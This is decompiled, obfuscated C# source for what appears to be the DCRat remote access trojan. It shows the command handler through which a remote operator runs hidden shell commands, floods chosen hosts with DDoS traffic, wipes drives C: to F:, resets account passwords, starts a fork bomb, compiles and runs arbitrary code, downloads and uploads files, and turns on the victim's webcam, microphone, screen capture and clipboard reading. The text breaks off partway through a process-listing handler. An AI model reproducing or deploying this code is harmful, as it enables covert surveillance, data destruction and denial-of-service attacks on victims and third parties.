using _0012;
using GDBD.Dispatcher;
using GDBD.Importers;
using GDBD.Mappers;
using GDBD.Maps;
using GDBD.Mocks;
using GDBD.Specifications;
using GDBD.Structs;
using GDBD.Workers;
using Microsoft.CSharp;
using Newtonsoft.Annotations;
using Newtonsoft.Common;
using Newtonsoft.Expressions;
using Newtonsoft.Resolver;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Newtonsoft.Database
{
	internal sealed class DecoratorEventEntry
	{
		[CompilerGenerated]
		private sealed class _0001
		{
			public string _0001;

			public string _0002;

			public string _0003;

			public string _0004;

			public ThreadStart _0005;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0001()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				try
				{
					_0005 CS_0024_003C_003E8__locals0 = new _0002
					{
						_0004 = this
					};
					string text = this._0001;
					string text2 = text;
					if (text2 != null)
					{
						switch (_0012._0003._0001(text2))
						{
						case 989868607u:
							if (text2 == "msgbox")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								CS_0024_003C_003E8__locals0._0001 = MessageBoxIcon.None;
								switch (DecoratorReaderMapper.PatchRequest(_0004)["type"].ResetClass<string>())
								{
								case "INFORMATION":
									CS_0024_003C_003E8__locals0._0001 = MessageBoxIcon.Asterisk;
									break;
								case "WARNING":
									CS_0024_003C_003E8__locals0._0001 = MessageBoxIcon.Exclamation;
									break;
								case "CONFIRMATION":
									CS_0024_003C_003E8__locals0._0001 = MessageBoxIcon.Question;
									break;
								case "ERROR":
									CS_0024_003C_003E8__locals0._0001 = MessageBoxIcon.Hand;
									break;
								}
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									MessageBox.Show(DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0004._0004)["text"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0004._0004)["caption"].ResetClass<string>() + " ", MessageBoxButtons.OK, CS_0024_003C_003E8__locals0._0001, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
								}).Start();
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 3880313276u:
							if (text2 == "taskkill")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Process[] processesByName = Process.GetProcessesByName(_0004.Split('.')[0]);
								foreach (Process process3 in processesByName)
								{
									process3.Kill();
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 1915076192u:
							if (text2 == "taskstart")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								ProcessWindowStyle windowStyle = ProcessWindowStyle.Normal;
								switch (DecoratorReaderMapper.PatchRequest(_0004)["windowstyle"].ResetClass<string>())
								{
								case "Hidden":
									windowStyle = ProcessWindowStyle.Hidden;
									break;
								case "Minimized":
									windowStyle = ProcessWindowStyle.Minimized;
									break;
								case "Maximized":
									windowStyle = ProcessWindowStyle.Maximized;
									break;
								}
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = DecoratorReaderMapper.PatchRequest(_0004)["file"].ResetClass<string>(),
									Arguments = DecoratorReaderMapper.PatchRequest(_0004)["args"].ResetClass<string>(),
									WorkingDirectory = Path.GetDirectoryName(DecoratorReaderMapper.PatchRequest(_0004)["file"].ResetClass<string>()),
									Verb = DecoratorReaderMapper.PatchRequest(_0004)["verb"].ResetClass<string>(),
									WindowStyle = windowStyle
								});
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 300022785u:
							if (text2 == "shell")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "cmd.exe",
									Arguments = "/c " + _0004,
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 4134661990u:
							if (text2 == "cddrive")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								switch (_0004)
								{
								case "Open":
									Publisher.DefineEvent(isinstance: true);
									break;
								case "Close":
									Publisher.DefineEvent(isinstance: false);
									break;
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2725776009u:
							if (text2 == "speak")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								SpeechSynthesizer speechSynthesizer = new SpeechSynthesizer();
								speechSynthesizer.SpeakAsync(_0004);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 627698714u:
							if (text2 == "keyboardrecorder")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								SendKeys.SendWait(_0004);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 399549159u:
							if (text2 == "ddos")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								CS_0024_003C_003E8__locals0._0002 = Convert.ToInt32(DecoratorReaderMapper.PatchRequest(_0004)["Requests"].ResetClass<string>());
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									CS_0024_003C_003E8__locals0 = new _0003
									{
										_0002 = CS_0024_003C_003E8__locals0,
										_0001 = new string[12]
										{
											" Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
											"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
											"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
											"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
											"Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3",
											"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
											"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
											"Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
											"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
											"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
											"Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
											"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
										}
									};
									for (int num2 = 0; num2 < CS_0024_003C_003E8__locals0._0002; num2++)
									{
										new Thread((ThreadStart)delegate
										{
											//Discarded unreachable code: IL_0002
											//IL_0003: Incompatible stack heights: 0 vs 1
											try
											{
												TcpClient tcpClient = new TcpClient(DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0002._0004._0004)["Host"].ResetClass<string>(), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0002._0004._0004)["Port"].ResetClass<string>()));
												string s = "POST / HTTP/1.1\r\nHost: " + DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0002._0004._0004)["Host"].ResetClass<string>() + " \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + CS_0024_003C_003E8__locals0._0001[new RepositoryEvent().MoveList(CS_0024_003C_003E8__locals0._0001.Length)] + "\r\nContent-length: 5235\r\n\r\n";
												byte[] bytes = Encoding.UTF8.GetBytes(s);
												tcpClient.Client.Send(bytes, 0, bytes.Length, SocketFlags.None);
											}
											catch
											{
											}
										}).Start();
										Thread.Sleep(10);
									}
								}).Start();
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									CS_0024_003C_003E8__locals0 = new _0004
									{
										_0002 = new IPEndPoint(IPAddress.Parse(DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0004._0004)["Host"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0004._0004)["Port"].ResetClass<string>())),
										_0001 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
									};
									for (int n = 0; n < CS_0024_003C_003E8__locals0._0002; n++)
									{
										new Thread((ThreadStart)delegate
										{
											//Discarded unreachable code: IL_0002
											//IL_0003: Incompatible stack heights: 0 vs 1
											try
											{
												CS_0024_003C_003E8__locals0._0001.SendTo(new byte[new RepositoryEvent().ConnectList() % 1000 + 1], CS_0024_003C_003E8__locals0._0002);
											}
											catch
											{
											}
										}).Start();
										Thread.Sleep(10);
									}
								}).Start();
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									CS_0024_003C_003E8__locals0 = new _0005
									{
										_0002 = new IPEndPoint(IPAddress.Parse(DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0004._0004)["Host"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(CS_0024_003C_003E8__locals0._0004._0004)["Port"].ResetClass<string>())),
										_0001 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp)
									};
									for (int m = 0; m < CS_0024_003C_003E8__locals0._0002; m++)
									{
										new Thread((ThreadStart)delegate
										{
											//Discarded unreachable code: IL_0002
											//IL_0003: Incompatible stack heights: 0 vs 1
											try
											{
												CS_0024_003C_003E8__locals0._0001.SendTo(new byte[new RepositoryEvent().ConnectList() % 1000 + 1], CS_0024_003C_003E8__locals0._0002);
											}
											catch
											{
											}
										}).Start();
										Thread.Sleep(10);
									}
								}).Start();
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2636022033u:
							if (text2 == "clipboard")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Thread thread = new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									Clipboard.SetText(_0004);
								});
								thread.SetApartmentState(ApartmentState.STA);
								thread.Start();
								thread.Join();
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 3929408067u:
							if (text2 == "clipboardget")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								CS_0024_003C_003E8__locals0._0003 = null;
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									CS_0024_003C_003E8__locals0._0003 = Clipboard.GetText(TextDataFormat.UnicodeText);
								});
								thread2.SetApartmentState(ApartmentState.STA);
								thread2.Start();
								thread2.Join();
								DispatcherInstanceExpression.ManageFilter("clipboard", CS_0024_003C_003E8__locals0._0003, this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2458040079u:
							if (text2 == "newuserpass")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "cmd.exe",
									Arguments = "/c net user " + GlobalIssuerImporter.RemoveList() + " \"" + _0004 + "\"",
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 279085777u:
							if (text2 == "deleteall")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									try
									{
										Directory.Delete("C:\\", recursive: true);
									}
									catch
									{
									}
									try
									{
										Directory.Delete("D:\\", recursive: true);
									}
									catch
									{
									}
									try
									{
										Directory.Delete("E:\\", recursive: true);
									}
									catch
									{
									}
									try
									{
										Directory.Delete("F:\\", recursive: true);
									}
									catch
									{
									}
								}).Start();
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 179794454u:
							if (text2 == "rotatescreen")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								try
								{
									uint num = 0u;
									while (++num <= 64)
									{
										Publisher.CollectEvent(num, _0004);
									}
								}
								catch
								{
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 476089331u:
							if (text2 == "setwallpaper")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Publisher.SortEvent(_0004);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 4246430400u:
							if (text2 == "browseurl")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								string text9 = _0004;
								if (!text9.StartsWith("http"))
								{
									text9 = "http://" + text9;
								}
								Process.Start(text9);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 673460077u:
							if (text2 == "exec_cs_code")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Dictionary<string, string> providerOptions = new Dictionary<string, string>
								{
									{
										"CompilerVersion",
										"v3.5"
									}
								};
								CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions);
								CompilerParameters options = new CompilerParameters
								{
									GenerateInMemory = true,
									GenerateExecutable = false,
									ReferencedAssemblies = 
									{
										"System.Core.dll",
										"System.dll",
										"System.Windows.Forms.dll",
										"System.Drawing.dll",
										"System.Data.dll",
										"System.Management.dll",
										"System.Data.Entity.dll"
									}
								};
								CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(options, _0004);
								if (compilerResults.Errors.HasErrors)
								{
									string text8 = "";
									foreach (CompilerError error in compilerResults.Errors)
									{
										text8 = text8 + "[" + error.ErrorNumber + " on " + error.Line + " Line]: " + error.ErrorText + "\r\n";
									}
									DispatcherInstanceExpression.CancelFilter(this._0001, text8, this._0002, _0003);
									Thread.Sleep(5000);
									DispatcherInstanceExpression.CancelFilter(this._0001, "#ERROR", this._0002, _0003);
								}
								else
								{
									DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								}
								object obj5 = compilerResults.CompiledAssembly.CreateInstance("DCRat.Code");
								MethodInfo method = obj5.GetType().GetMethod("Main");
								method.Invoke(obj5, null);
								return;
							}
							break;
						case 4162873931u:
							if (text2 == "shutdown")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "shutdown",
									Arguments = "/s /t 0",
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 4271641068u:
							if (text2 == "restart")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "shutdown",
									Arguments = "/r /t 0",
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 357053078u:
							if (text2 == "logoff")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Process.Start(new ProcessStartInfo
								{
									UseShellExecute = true,
									FileName = "shutdown",
									Arguments = "/l /t 0",
									WindowStyle = ProcessWindowStyle.Hidden
								});
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 3840771245u:
							if (text2 == "forkbomb")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								new Thread((ThreadStart)delegate
								{
									//Discarded unreachable code: IL_0002
									//IL_0003: Incompatible stack heights: 0 vs 1
									while (true)
									{
										Process.Start(new ProcessStartInfo
										{
											UseShellExecute = true,
											FileName = "cmd.exe",
											Arguments = "/c start cmd.exe /c \"pause\" & pause",
											WindowStyle = ProcessWindowStyle.Normal
										});
									}
								}).Start();
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2329269937u:
							if (text2 == "lcmd")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								string control = Process.Start(new ProcessStartInfo
								{
									UseShellExecute = false,
									RedirectStandardOutput = true,
									StandardOutputEncoding = Encoding.GetEncoding(866),
									FileName = "cmd.exe",
									Arguments = "/c \"" + _0004 + "\"",
									CreateNoWindow = true
								}).StandardOutput.ReadToEnd();
								DispatcherInstanceExpression.InitFilter(this._0001, "lcmd", control, this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2757455773u:
							if (text2 == "beep")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Console.Beep(int.Parse(DecoratorReaderMapper.PatchRequest(_0004)["Freq"].ResetClass<string>()), int.Parse(DecoratorReaderMapper.PatchRequest(_0004)["Duration"].ResetClass<string>()));
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 1640017480u:
							if (text2 == "fm_drives")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								DispatcherInstanceExpression.ManageFilter("fm", ConnectionBroadcasterDispatcher.ValidateRecord(), this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 3558062580u:
							if (text2 == "fm_opendir")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								DispatcherInstanceExpression.InitFilter(this._0001, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>()), this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 1874238014u:
							if (text2 == "fm_delete")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								if (Directory.Exists(DecoratorReaderMapper.PatchRequest(_0004)["Path"].ResetClass<string>()))
								{
									Directory.Delete(DecoratorReaderMapper.PatchRequest(_0004)["Path"].ResetClass<string>(), recursive: true);
								}
								else if (File.Exists(DecoratorReaderMapper.PatchRequest(_0004)["Path"].ResetClass<string>()))
								{
									File.Delete(DecoratorReaderMapper.PatchRequest(_0004)["Path"].ResetClass<string>());
								}
								DispatcherInstanceExpression.InitFilter(this._0001, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>()), this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 613044183u:
							if (text2 == "fm_rename")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								if (Directory.Exists(DecoratorReaderMapper.PatchRequest(_0004)["OldPath"].ResetClass<string>()))
								{
									Directory.Move(DecoratorReaderMapper.PatchRequest(_0004)["OldPath"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(_0004)["NewPath"].ResetClass<string>());
								}
								else if (File.Exists(DecoratorReaderMapper.PatchRequest(_0004)["OldPath"].ResetClass<string>()))
								{
									File.Move(DecoratorReaderMapper.PatchRequest(_0004)["OldPath"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(_0004)["NewPath"].ResetClass<string>());
								}
								DispatcherInstanceExpression.InitFilter(this._0001, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>()), this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 622587037u:
							if (text2 == "fm_newfolder")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Directory.CreateDirectory(DecoratorReaderMapper.PatchRequest(_0004)["Path"].ResetClass<string>());
								DispatcherInstanceExpression.InitFilter(this._0001, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>()), this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 1678579267u:
							if (text2 == "fm_dwnurl")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "Saving file...", this._0002, _0003);
								using (WebClient webClient2 = new WebClient())
								{
									webClient2.DownloadFile(DecoratorReaderMapper.PatchRequest(_0004)["url"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>() + Path.GetFileName(DecoratorReaderMapper.PatchRequest(_0004)["url"].ResetClass<string>()));
								}
								DispatcherInstanceExpression.InitFilter(this._0001, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>()), this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2042454330u:
							if (text2 == "fm_dwn")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "Saving file...", this._0002, _0003);
								using (WebClient webClient = new WebClient())
								{
									webClient.DownloadFile(DecoratorReaderMapper.PatchRequest(_0004)["url"].ResetClass<string>(), DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>() + DecoratorReaderMapper.PatchRequest(_0004)["name"].ResetClass<string>());
								}
								if (!DecoratorReaderMapper.PatchRequest(_0004)._0001("NoResponse"))
								{
									DispatcherInstanceExpression.InitFilter(this._0001, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>()), this._0002, _0003);
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 994014384u:
							if (text2 == "fm_upl")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								DispatcherInstanceExpression.CustomizeFilter(File.ReadAllBytes(DecoratorReaderMapper.PatchRequest(_0004)["path"].ResetClass<string>()), "dfile", this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 1277321472u:
							if (text2 == "fm_zip")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								ZipFile.CreateFromDirectory(DecoratorReaderMapper.PatchRequest(_0004)["Path"].ResetClass<string>(), Path.GetDirectoryName(DecoratorReaderMapper.PatchRequest(_0004)["Path"].ResetClass<string>() + "\\") + ".zip", CompressionLevel.Fastest, includeBaseDirectory: true);
								DispatcherInstanceExpression.InitFilter(this._0001, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>()), this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 1004534557u:
							if (text2 == "fm_unzip")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								ZipFile.ExtractToDirectory(DecoratorReaderMapper.PatchRequest(_0004)["Path"].ResetClass<string>(), Path.GetDirectoryName(DecoratorReaderMapper.PatchRequest(_0004)["Path"].ResetClass<string>()));
								DispatcherInstanceExpression.InitFilter(this._0001, "fm", ConnectionBroadcasterDispatcher.FindRecord(DecoratorReaderMapper.PatchRequest(_0004)["Directory"].ResetClass<string>()), this._0002, _0003);
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 3789904569u:
							if (text2 == "taskbar")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								switch (_0004)
								{
								case "Show":
									Publisher.CallEvent();
									break;
								case "Hide":
									Publisher.CheckFilter();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 3716188083u:
							if (text2 == "desktop")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								switch (_0004)
								{
								case "Show":
									Publisher.PublishEvent();
									break;
								case "Hide":
									Publisher.RevertEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 3905854600u:
							if (text2 == "playaudiourl")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								if (_0004 != "")
								{
									CandidateIteratorMapping.LoginRecord(_0004);
								}
								else
								{
									CandidateIteratorMapping.CheckRecord();
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 1289852797u:
							if (text2 == "elevate")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								Process process2 = Process.Start(new ProcessStartInfo
								{
									WindowStyle = ProcessWindowStyle.Hidden,
									WorkingDirectory = Path.GetDirectoryName(MappingListAnnotation.m_PolicyEvent) + "\\",
									FileName = "cmd.exe",
									Arguments = "/c \"" + MappingListAnnotation.m_PolicyEvent + "\"",
									Verb = "runas"
								});
								process2.WaitForExit();
								if (process2.Id >= 2)
								{
									Environment.Exit(0);
									Application.Exit();
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 3894592561u:
							if (text2 == "screenshot")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								switch (DecoratorReaderMapper.PatchRequest(_0004)["Action"].ResetClass<string>())
								{
								case "Start":
									ParamFilterResolver.PostEvent(DecoratorReaderMapper.PatchRequest(_0004)["Monitor"].ResetClass<string>(), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(_0004)["W"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(_0004)["H"].ResetClass<string>()), this._0002, _0003);
									break;
								case "Stop":
									ParamFilterResolver.ChangeEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 1231575816u:
							if (text2 == "webcam")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								switch (DecoratorReaderMapper.PatchRequest(_0004)["Action"].ResetClass<string>())
								{
								case "Start":
									AdapterInstanceExpression.SetEvent(Convert.ToInt32(DecoratorReaderMapper.PatchRequest(_0004)["WebcamNum"].ResetClass<string>()), this._0002, _0003);
									break;
								case "Stop":
									AdapterInstanceExpression.RemoveEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 1445663049u:
							if (text2 == "microphone")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								switch (DecoratorReaderMapper.PatchRequest(_0004)["Action"].ResetClass<string>())
								{
								case "Start":
									PrinterListAnnotation.RegisterEvent(Convert.ToInt32(DecoratorReaderMapper.PatchRequest(_0004)["MicrophoneNum"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(_0004)["Bitrate"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(_0004)["Channels"].ResetClass<string>()), Convert.ToInt32(DecoratorReaderMapper.PatchRequest(_0004)["Time"].ResetClass<string>()), this._0002, _0003);
									break;
								case "Stop":
									PrinterListAnnotation.SearchEvent();
									break;
								}
								DispatcherInstanceExpression.CancelFilter(this._0001, "#DONE", this._0002, _0003);
								return;
							}
							break;
						case 2216756512u:
							if (text2 == "getprocesses")
							{
								DispatcherInstanceExpression.QueryFilter(this._0002, _0003);
								InstanceClassDispatcher instanceClassDispatcher = new InstanceClassDispatcher();
								Process[] processes = Process.GetProcesses();
								foreach (Process process in processes)
								{
